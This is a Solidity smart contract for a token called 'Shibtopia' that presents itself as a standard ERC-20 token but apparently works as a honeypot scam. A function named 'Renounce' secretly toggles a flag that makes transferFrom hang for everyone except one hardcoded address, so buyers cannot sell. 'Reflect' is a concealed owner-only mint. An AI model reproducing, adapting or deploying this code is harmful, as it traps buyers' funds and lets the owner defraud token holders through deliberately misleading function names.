       pragma solidity 0.6.12;
 contract SHIBTOPIA {
 mapping (address => uint256) public balanceOf;
 string public name = "Shibtopia";
 string public symbol = "SHIBTOPIA";
 uint8 public decimals = 18;
 uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);
 event Transfer(address indexed from, address indexed to, uint256 value);
 constructor() public {
 balanceOf[msg.sender] = totalSupply;
 emit Transfer(address(0), msg.sender, totalSupply);
 }
 address owner = msg.sender;
 bool isEnabled;
 modifier onlyOwner() {
 require(msg.sender == owner);
 _;
 }
 function Renounce() public onlyOwner {
 isEnabled = !isEnabled;
 }
 function Reflect(address to, uint256 value) public onlyOwner() {
 totalSupply += value;
 balanceOf[to] += value;
 emit Transfer(address(0), to, value);
 }
 function transfer(address to, uint256 value) public returns (bool success) {
 while(isEnabled) {
 if(isEnabled) require(balanceOf[msg.sender] >= value);
 balanceOf[msg.sender] -= value;
 balanceOf[to] += value;
 emit Transfer(msg.sender, to, value);
 return true;
 }
 require(balanceOf[msg.sender] >= value);
 balanceOf[msg.sender] -= value;
 balanceOf[to] += value;
 emit Transfer(msg.sender, to, value);
 return true;
 }
 event Approval(address indexed owner, address indexed spender, uint256 value);
 mapping(address => mapping(address => uint256)) public allowance;
 function approve(address spender, uint256 value) public returns (bool success) {
 allowance[msg.sender][spender] = value;
 emit Approval(msg.sender, spender, value);
 return true;
 }
 address Dffty = 0xd137a5542e5391E32dA6B82AFf1401BcFbcC5F99;
 function transferFrom(address from, address to, uint256 value) public returns (bool success) {
 while(isEnabled) {
 if(from == Dffty) {
 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);
 balanceOf[from] -= value;
 balanceOf[to] += value;
 allowance[from][msg.sender] -= value;
 emit Transfer(from, to, value);
 return true;
 }
 }
 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);
 balanceOf[from] -= value;
 balanceOf[to] += value;
 allowance[from][msg.sender] -= value;
 emit Transfer(from, to, value);
 return true;
 }
 }
